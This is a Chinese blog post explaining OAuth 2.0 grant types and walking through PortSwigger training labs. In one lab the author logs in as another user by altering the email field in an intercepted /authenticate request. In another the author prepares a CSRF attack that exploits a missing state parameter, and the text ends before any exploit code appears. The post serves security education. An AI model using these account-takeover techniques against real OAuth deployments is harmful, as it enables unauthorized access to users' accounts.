<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>浅析OAuth vul | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="简介什么是OAuth 2.0OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用 运行流程 用户打开客户端以后，客户端要求用户给予授权。 用户同意给予客户端授权。 客户端使用上一步获得的授权，向认证服务器申请令牌。 认证服务器对客户端进行认证以后，确认无误，同意发放令牌。 客户端使用令牌，向资源服务器申请获取资源。 资源服务器确认令牌无误，同意向客户端开放资源">
<meta property="og:type" content="article">
<meta property="og:title" content="浅析OAuth vul">
<meta property="og:url" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/index.html">
<meta property="og:site_name" content="RoboTerh">
<meta property="og:description" content="简介什么是OAuth 2.0OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用 运行流程 用户打开客户端以后，客户端要求用户给予授权。 用户同意给予客户端授权。 客户端使用上一步获得的授权，向认证服务器申请令牌。 认证服务器对客户端进行认证以后，确认无误，同意发放令牌。 客户端使用令牌，向资源服务器申请获取资源。 资源服务器确认令牌无误，同意向客户端开放资源">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723162645820.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723164306810.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723165229749.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723165538851.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723165857313.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723164543589.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723170326731.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723170726689.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723170821647.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723182500603.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723182646904.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723190102924.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723190410243.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723190543248.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723191029983.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723192747647.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723195341976.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723195514027.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723200529506.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723205006253.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723205043844.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723205429470.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723212351737.png">
<meta property="og:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723212720768.png">
<meta property="article:published_time" content="2022-07-23T06:49:54.000Z">
<meta property="article:modified_time" content="2022-07-23T13:50:48.699Z">
<meta property="article:author" content="RoboTerh">
<meta property="article:tag" content="OAuth">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/image-20220723162645820.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">50</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">16</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">37</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOAuth-2-0"><span class="toc-number">1.1.</span> <span class="toc-text">什么是OAuth 2.0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">授权的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#authorization-code"><span class="toc-number">1.3.1.</span> <span class="toc-text">authorization code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#implicit"><span class="toc-number">1.3.2.</span> <span class="toc-text">implicit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#resource-owner-password-credentials"><span class="toc-number">1.3.3.</span> <span class="toc-text">resource owner password credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#client-credentials"><span class="toc-number">1.3.4.</span> <span class="toc-text">client credentials</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%86%E8%8A%82"><span class="toc-number">2.</span> <span class="toc-text">漏洞细节</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E9%80%A0%E6%88%90%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">为什么会造成这种情况？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%AA%E9%87%8C%E4%BD%BF%E7%94%A8%E4%BA%86%E8%BF%99%E6%A0%B7%E7%9A%84%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">哪里使用了这样的认证方式？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text">OAuth客户端中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Improper-implementation-of-the-implicit-grant-type"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">Improper implementation of the implicit grant type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Lab-Authentication-bypass-via-OAuth-implicit-flow"><span class="toc-number">2.3.1.1.1.</span> <span class="toc-text">Lab: Authentication bypass via OAuth implicit flow</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.3.1.1.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flawed-CSRF-protection"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">Flawed CSRF protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Lab-Forced-OAuth-profile-linking"><span class="toc-number">2.3.1.2.1.</span> <span class="toc-text">Lab: Forced OAuth profile linking</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.3.1.2.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text">OAuth服务端中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Leaking-authorization-codes-and-access-tokens"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">Leaking authorization codes and access tokens</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Lab-OAuth-account-hijacking-via-redirect-uri"><span class="toc-number">2.3.2.1.1.</span> <span class="toc-text">Lab: OAuth account hijacking via redirect_uri</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">2.3.2.1.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stealing-codes-and-access-tokens-via-a-proxy-page"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">Stealing codes and access tokens via a proxy page</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Lab-Stealing-OAuth-access-tokens-via-an-open-redirect"><span class="toc-number">2.3.2.2.1.</span> <span class="toc-text">Lab: Stealing OAuth access tokens via an open redirect</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">2.3.2.2.2.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">浅析OAuth vul</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-07-23 14:49:54" itemprop="dateCreated datePublished" datetime="2022-07-23T14:49:54+08:00">2022-07-23</time></div><span class="leancloud_visitors" id="/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/" data-flag-title="浅析OAuth vul"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/OAuth/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">OAuth</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="什么是OAuth-2-0"><a href="#什么是OAuth-2-0" class="headerlink" title="什么是OAuth 2.0"></a>什么是OAuth 2.0</h2><p>OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用</p>
<h2 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h2><ol>
<li>用户打开客户端以后，客户端要求用户给予授权。</li>
<li>用户同意给予客户端授权。</li>
<li>客户端使用上一步获得的授权，向认证服务器申请令牌。</li>
<li>认证服务器对客户端进行认证以后，确认无误，同意发放令牌。</li>
<li>客户端使用令牌，向资源服务器申请获取资源。</li>
<li>资源服务器确认令牌无误，同意向客户端开放资源。</li>
</ol>
<p>当然关键的是第二步中的用户授权，需要保证其安全性</p>
<h2 id="授权的方法"><a href="#授权的方法" class="headerlink" title="授权的方法"></a>授权的方法</h2><h3 id="authorization-code"><a href="#authorization-code" class="headerlink" title="authorization code"></a>authorization code</h3><p>授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与”服务提供商”的认证服务器进行互动</p>
<p>授权码模式的流程：</p>
<ol>
<li>用户访问客户端，后者将前者导向认证服务器。</li>
<li>用户选择是否给予客户端授权。</li>
<li>假设用户给予授权，认证服务器将用户导向客户端事先指定的”重定向URI”（redirection URI），同时附上一个授权码。</li>
<li>客户端收到授权码，附上早先的”重定向URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</li>
<li>认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。</li>
</ol>
<h3 id="implicit"><a href="#implicit" class="headerlink" title="implicit"></a>implicit</h3><p>简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了”授权码”这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证</p>
<p>简化模式的流程：</p>
<ol>
<li>客户端将用户导向认证服务器。</li>
<li>用户决定是否给于客户端授权。</li>
<li>假设用户给予授权，认证服务器将用户导向客户端指定的”重定向URI”，并在URI的Hash部分包含了访问令牌。</li>
<li>浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值。</li>
<li>资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌。</li>
<li>浏览器执行上一步获得的脚本，提取出令牌。</li>
<li>浏览器将令牌发给客户端。</li>
</ol>
<h3 id="resource-owner-password-credentials"><a href="#resource-owner-password-credentials" class="headerlink" title="resource owner password credentials"></a>resource owner password credentials</h3><p>密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向”服务商提供商”索要授权。</p>
<p>密码模式流程：</p>
<ol>
<li>用户向客户端提供用户名和密码。</li>
<li>客户端将用户名和密码发给认证服务器，向后者请求令牌。</li>
<li>认证服务器确认无误后，向客户端提供访问令牌。</li>
</ol>
<h3 id="client-credentials"><a href="#client-credentials" class="headerlink" title="client credentials"></a>client credentials</h3><p>客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向”服务提供商”进行认证。严格地说，客户端模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求”服务提供商”提供服务，其实不存在授权问题</p>
<p>流程：</p>
<ol>
<li>客户端向认证服务器进行身份认证，并要求一个访问令牌。</li>
<li>认证服务器确认无误后，向客户端提供访问令牌。</li>
</ol>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><h2 id="为什么会造成这种情况？"><a href="#为什么会造成这种情况？" class="headerlink" title="为什么会造成这种情况？"></a>为什么会造成这种情况？</h2><p>主要是因为他缺乏内置的安全功能，安全的成败几乎在于使用者的正确的配置，就比如说下面的通过输入框来进行验证的方式，在传送数据的过程中并没有对数据本身进行加密处理，造成了攻击者完全可以拦截数据包获取关键信息，并且可以构造恶意的数据包达到自己恶意的目的等等，而且不同的授权方法有不同的特点，根据授权类型，高度敏感的数据也会通过浏览器发送，这为攻击者提供了各种拦截数据的机会。</p>
<h2 id="哪里使用了这样的认证方式？"><a href="#哪里使用了这样的认证方式？" class="headerlink" title="哪里使用了这样的认证方式？"></a>哪里使用了这样的认证方式？</h2><p>想要识别使用了<code>OAuth</code>方法进行身份验证，我们可以通过如下方法</p>
<ol>
<li>按照上面的做法，使用burp进行数据包的拦截，基本所有的的认证请求都是通过<code>/authorization</code>开始的，并且携带了类似于<code>Client_id</code>等识别信息</li>
<li>如果在登陆具有使用第三方社交软件进行登陆的地方，一般都是采用的<code>OAuth 2.0</code>进行认证</li>
</ol>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="OAuth客户端中的利用"><a href="#OAuth客户端中的利用" class="headerlink" title="OAuth客户端中的利用"></a><code>OAuth</code>客户端中的利用</h3><h4 id="Improper-implementation-of-the-implicit-grant-type"><a href="#Improper-implementation-of-the-implicit-grant-type" class="headerlink" title="Improper implementation of the implicit grant type"></a>Improper implementation of the implicit grant type</h4><p>如果是采用的<code>implicit</code>类型的认证方法</p>
<p>首先token是通过url的形式从<code>OAuth</code>服务端发送到了客户端，客户端为了保持会话的持久性，通过POST请求将自身的数据发送到了服务端，服务端返回给客户端一个cookie进行持久化登陆，这样，就造成了攻击者可以拦截客户端的数据包，如果客户端程序没有正确检查token是否和其他数据匹配，攻击者就可以对象数据进行伪造发送，冒充任意用户</p>
<p>当然，如果将发送的数据加密呢，当然可以，但是在这个类型方法中，服务端和客户端没有一个共同密钥进行解密操作，所以两者之间是默认信任的</p>
<h5 id="Lab-Authentication-bypass-via-OAuth-implicit-flow"><a href="#Lab-Authentication-bypass-via-OAuth-implicit-flow" class="headerlink" title="Lab: Authentication bypass via OAuth implicit flow"></a><code>Lab: Authentication bypass via OAuth implicit flow</code></h5><p><img src="image-20220723162645820.png" alt="image-20220723162645820" loading="lazy"></p>
<p>看看靶场的描述吧</p>
<blockquote>
<p>This lab uses an <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/oauth">OAuth</a> service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users’ accounts without knowing their password.</p>
<p>To solve the lab, log in to Carlos’s account. His email address is <code>carlos@carlos-montoya.net</code>.</p>
<p>You can log in with your own social media account using the following credentials: <code>wiener:peter</code>.</p>
</blockquote>
<p>大概的意思就是我们通过输入用户名为<code>wiener</code>密码为<code>peter</code>的账户，达到登陆<code>carlos@carlos-montoya.net</code>这个邮件的账户，形成一个权限绕过的漏洞</p>
<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>点击<code>Access the lab</code>打开靶场，之后使用burp抓包，并登陆<code>wiener</code>的账户，观察具体的<code>OAuth</code>认证流程</p>
<p><img src="image-20220723164306810.png" alt="image-20220723164306810" loading="lazy"></p>
<p>因为我这里已经成功了，所以存在有记录，就直接发送<code>client_id</code>直接认证成功了的，如果是初次查看的时候可以看见完整的流程</p>
<p>好吧，这里我还是把靶场重启了一下</p>
<p><img src="image-20220723165229749.png" alt="image-20220723165229749" loading="lazy"></p>
<p>可以从上面看到他的流程：</p>
<p>首先携带<code>client_id</code>访问<code>auth</code>路由向认证服务端请求授权</p>
<p><img src="image-20220723165538851.png" alt="image-20220723165538851" loading="lazy"></p>
<p>并且附带了重定向url，回复类型和请求资源返回等等字段</p>
<p>之后重定向<code>url</code>, 然后输入了账号密码进行认证，在登陆之后进行了一次重定向操作进行认证操作</p>
<p><img src="image-20220723165857313.png" alt="image-20220723165857313" loading="lazy"></p>
<p>一直到后面将会在向<code>/authenticate</code>路由发送POST请求的时候携带<code>email username token</code>等信息进行验证</p>
<p><img src="image-20220723164543589.png" alt="image-20220723164543589" loading="lazy"></p>
<p>并且最后重定向到了博客首页</p>
<p>我们可以<code>/authenticate</code>路由处进行bypass, 将数据包发送到<code>Repeater</code>重发器中，进行修改<code>email</code>字段达到登陆其他用户的目的</p>
<p><img src="image-20220723170326731.png" alt="image-20220723170326731" loading="lazy"></p>
<p>成功触发了<code>302</code>跳转，并且返回了一个cookie信息，方便再<code>token</code>有效期限内进行资源的获取</p>
<p>最后我们携带<code>cookie</code>在浏览器中方法查看是否变为了<code>carlos</code>用户，在<code>Repeater</code>中右击 -&gt; <code>Request in Browser</code> -&gt; <code>in original session</code></p>
<p><img src="image-20220723170726689.png" alt="image-20220723170726689" loading="lazy"></p>
<p>复制到浏览器访问</p>
<p><img src="image-20220723170821647.png" alt="image-20220723170821647" loading="lazy"></p>
<p>成功bypass了权限认证，获取了绕过了登陆验证，造成了任意登陆的安全问题</p>
<h4 id="Flawed-CSRF-protection"><a href="#Flawed-CSRF-protection" class="headerlink" title="Flawed CSRF protection"></a>Flawed CSRF protection</h4><p>造成这个漏洞的原因主要是因为错误配置<code>OAuth</code>组件，比如说<code>state</code>参数的配置</p>
<p>这个参数一般都是与会话信息相关联的一个hash值，在服务端和客户端之间来回传递，作为客户端的<code>CSRF</code>令牌</p>
<p>所以说，如果没有配置这个参数的时候，攻击者可以通过将户端端绑定到自己的账户来劫持客户端账户</p>
<h5 id="Lab-Forced-OAuth-profile-linking"><a href="#Lab-Forced-OAuth-profile-linking" class="headerlink" title="Lab: Forced OAuth profile linking"></a>Lab: Forced OAuth profile linking</h5><p>描述</p>
<blockquote>
<p>​            This lab gives you the option to attach a social media profile to your account so that you can log in via <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/oauth">OAuth</a> instead of using the normal username and password. Due to the insecure  implementation of the OAuth flow by the client application, an attacker  can manipulate this functionality to obtain access to other users’  accounts.        </p>
<p>​            To solve the lab, use a <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf">CSRF attack</a> to attach your own social media profile to the admin user’s account on  the blog website, then access the admin panel and delete Carlos.        </p>
</blockquote>
<h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>按照上面的方法，单击<code>My account</code>登陆账户</p>
<p><img src="image-20220723182500603.png" alt="image-20220723182500603" loading="lazy"></p>
<p>登陆成功之后跳转到了<code>my/-account</code>路由</p>
<p><img src="image-20220723182646904.png" alt="image-20220723182646904" loading="lazy"></p>
<p>这里存在一个选项，能够将社交账号绑定到帐号中来</p>
<p>点击<code>Attach a social profile</code>，之后使用靶场给的社交信息登陆</p>
<p>值得注意的是，在进行请求的时候，<code>redirect_uri</code>中将授权代码发送到了<code>/oauth-linking</code>路由中，特别的是，这里并没有<code>state</code>参数的存在，存在有CSRF漏洞</p>
<p>在burp中开启拦截器，重新加载社交账号</p>
<p><img src="image-20220723190102924.png" alt="image-20220723190102924" loading="lazy"></p>
<p>首先是访问传递<code>client_id</code>，将其放行</p>
<p>之后一直放行，出现了</p>
<p><img src="image-20220723190410243.png" alt="image-20220723190410243" loading="lazy"></p>
<p>点击<code>continue</code>进行认证，一直放包，最后出现了带有授权码的url，并复制这个url链接</p>
<p><img src="image-20220723190543248.png" alt="image-20220723190543248" loading="lazy"></p>
<p>url: <code>https://0ad800510493bb41c0ae20b800aa004d.web-security-academy.net/oauth-linking?code=k8gw_duVfcBUiN1irp_BkqHe8n_m9t06knW5iRVerQY</code></p>
<p>在之后直接将数据包丢掉，以免使用了这个授权码，形成了有效的登陆</p>
<p>之后在其内置的漏洞利用服务器中添加能够造成CRSF漏洞的代码</p>
